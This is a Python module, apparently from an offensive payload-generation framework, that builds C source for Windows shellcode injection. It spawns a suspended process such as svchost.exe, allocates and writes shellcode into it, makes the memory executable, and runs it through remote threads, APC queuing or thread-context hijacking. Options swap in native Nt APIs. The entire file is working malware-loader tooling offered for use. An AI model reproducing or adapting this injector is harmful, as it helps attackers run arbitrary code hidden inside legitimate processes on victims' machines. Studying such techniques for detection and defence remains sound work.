from string import Template
from pathlib import Path
import sys

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.apicallsList = ['CloseHandle']
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

        self.spawn = 'CreateProcessA'
        if 'spawn' in arguments:
            if arguments['spawn'] in ['CreateProcessA', 'NtCreateUserProcess']:
                self.spawn = arguments['spawn']
            else:
                print('Spawn argument must be CreateProcessA, or NtCreateUserProcess')
                exit(0)
        if self.spawn == 'CreateProcessA':
            self.spawnCode = Template("""
    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
""").substitute(target=self.target)
            self.apicallsList += ['CreateProcessA']
        elif self.spawn == 'NtCreateUserProcess':
            self.spawnCode = Template("""
    UNICODE_STRING image, cmdline, curdir, desktop;
    {RtlInitUnicodeString}(&image, L"C:\\\\Windows\\\\System32\\\\charmap.exe");
    {RtlInitUnicodeString}(&cmdline, L"charmap.exe");
    {RtlInitUnicodeString}(&curdir, L"C:\\\\Windows\\\\System32\\\\");
    {RtlInitUnicodeString}(&desktop, L"WinSta0\\\\Default");
    WCHAR kNtImage[] = L"\\\\??\\\\C:\\\\Windows\\\\System32\\\\charmap.exe";
    
    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
    PS_CREATE_INFO createInfo    = {{ sizeof(createInfo) }};     /* State defaults to initial */
    PS_ATTRIBUTE_LIST attrList = {{ sizeof(attrList) }};  /* room for exactly one */
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPWCH  env;
 
    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size      = sizeof(kNtImage) - sizeof(WCHAR);
    attrList.Attributes[0].ValuePtr  = (PVOID)kNtImage;

    env = GetEnvironmentStringsW();
 
    {RtlCreateProcessParametersEx}(&procParams, &image, NULL, &curdir, &cmdline, env, NULL, &desktop, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
 
    {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
""").substitute(target=self.target)
            self.apicallsList += ['NtCreateUserProcess', 'RtlCreateProcessParametersEx', 'RtlInitUnicodeString']

        self.allocation = 'VirtualAllocEx'
        if 'allocation' in arguments:
            if arguments['allocation'] in ['VirtualAllocEx', 'NtAllocateVirtualMemory']:
                self.allocation = arguments['allocation']
            else:
                print('Allocation argument must be VirtualAllocEx, or NtAllocateVirtualMemory')
                exit(0)
        if self.allocation == 'VirtualAllocEx':
            self.allocationCode = """
    LPVOID buffer = {VirtualAllocEx}(hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
"""
            self.apicallsList += ['VirtualAllocEx']
        elif self.allocation == 'NtAllocateVirtualMemory':
            self.allocationCode = """
    PVOID buffer = NULL;
    SIZE_T allocationSize = {shellcodeSize};
    {NtAllocateVirtualMemory}(hProcess, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
"""
            self.apicallsList += ['NtAllocateVirtualMemory']

        self.write = 'WriteProcessMemory'
        if 'write' in arguments:
            if arguments['write'] in ['WriteProcessMemory', 'NtWriteVirtualMemory']:
                self.write = arguments['write']
            else:
                print('Write argument must be WriteProcessMemory, or NtWriteVirtualMemory')
                exit(0)
        if self.write == 'WriteProcessMemory':
            self.writeCode = """
    {WriteProcessMemory}(hProcess, buffer, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
"""
            self.apicallsList += ['WriteProcessMemory']
        elif self.write == 'NtWriteVirtualMemory':
            self.writeCode = """
    SIZE_T bytesWritten = 0;
    {NtWriteVirtualMemory}(hProcess, buffer, shellcode, {shellcodeSize}, &bytesWritten);
"""
            self.apicallsList += ['NtWriteVirtualMemory']

        self.protect = 'VirtualProtectEx'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtectEx', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)
        if self.protect == 'VirtualProtectEx':
            self.protectCode = Template("""
    DWORD oldProtect;
    BOOL out = {VirtualProtectEx}(hProcess, buffer, {shellcodeSize}, $memoryPermission, &oldProtect);
""").substitute(memoryPermission=self.memoryPermission)
            self.apicallsList += ['VirtualProtectEx']
        elif self.protect == 'NtProtectVirtualMemory':
            self.protectCode = Template("""
    SIZE_T size = {shellcodeSize};
    ULONG OldProtect; 
    {NtProtectVirtualMemory}(hProcess, &buffer, &size, $memoryPermission, &OldProtect);
""").substitute(memoryPermission=self.memoryPermission)
            self.apicallsList += ['NtProtectVirtualMemory']

        self.execution = 'CreateRemoteThread'
        if 'execution' in arguments:
            if arguments['execution'] in ['CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx', 'NtQueueApcThread']:
                self.execution = arguments['execution']
            else:
                print('Execution argument must be CreateRemoteThread, QueueUserAPC, SetThreadContext, NtQueueApcThread, or NtCreateThreadEx')
                exit(0)
        if self.execution == 'CreateRemoteThread':
            self.executionCode = """
    HANDLE newThread = {CreateRemoteThread}(hProcess, NULL, 0, buffer, NULL, 0, NULL);
    """
            self.apicallsList += ['CreateRemoteThread']
        elif self.execution == 'QueueUserAPC':
            self.executionCode = """
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)buffer;
    {QueueUserAPC}((PAPCFUNC)buffer, hThread, (ULONG_PTR)NULL);
    {ResumeThread}(hThread);
"""
            self.apicallsList += ['QueueUserAPC', 'ResumeThread']
        elif self.execution == 'SetThreadContext':
            self.executionCode = """
    CONTEXT ctx = {{ 0 }};
    ctx.ContextFlags = CONTEXT_CONTROL; // e.g., RIP/RSP/EBP
    if ({GetThreadContext}(hThread, &ctx)) {{
        // Modify target register, e.g., ctx.Rip = newAddress;
        ctx.Rip = (DWORD64)buffer;
        {SetThreadContext}(hThread, &ctx);
    }}
    {ResumeThread}(hThread);
"""
            self.apicallsList += ['GetThreadContext', 'SetThreadContext', 'ResumeThread']
        elif self.execution == 'NtCreateThreadEx':
            self.executionCode = """
    HANDLE newThread;
    {NtCreateThreadEx}(&newThread, THREAD_ALL_ACCESS, NULL, hProcess, buffer, NULL, 0, 0, 0, 0, NULL);
"""
            self.apicallsList += ['NtCreateThreadEx', 'WaitForSingleObject']
        elif self.execution == 'NtQueueApcThread':
            self.executionCode = """
    //PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)buffer;
    {NtQueueApcThread}(hThread, buffer, NULL, NULL, 0);
    {ResumeThread}(hThread);
"""
            self.apicallsList += ['NtQueueApcThread', 'ResumeThread']

        self.wait = 'WaitForSingleObject'
        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject', 'None']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject, NtWaitForSingleObject, or None')
                exit(0)
        if self.wait == 'WaitForSingleObject':
            self.waitCode = """
    {WaitForSingleObject}(newThread, 500);
"""
            self.apicallsList += ['WaitForSingleObject']
        elif self.wait == 'NtWaitForSingleObject':
            self.waitCode = """
    LARGE_INTEGER li = {{ 0 }};
    li.QuadPart = 500;
    {NtWaitForSingleObject}(newThread, FALSE, &li);
"""
            self.apicallsList += ['NtWaitForSingleObject']
        elif self.wait == 'None':
            self.waitCode = ''

    def imports(self) -> list[str]:
        return ["#include <windows.h>",
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""
    {transformers}

    $spawn

    $allocation
    $write
    $protect
    $execution
    $wait

    {CloseHandle}(hThread);
    {CloseHandle}(hProcess);
""").substitute(execution=self.executionCode, spawn=self.spawnCode, allocation=self.allocationCode, write=self.writeCode, protect=self.protectCode, wait=self.waitCode)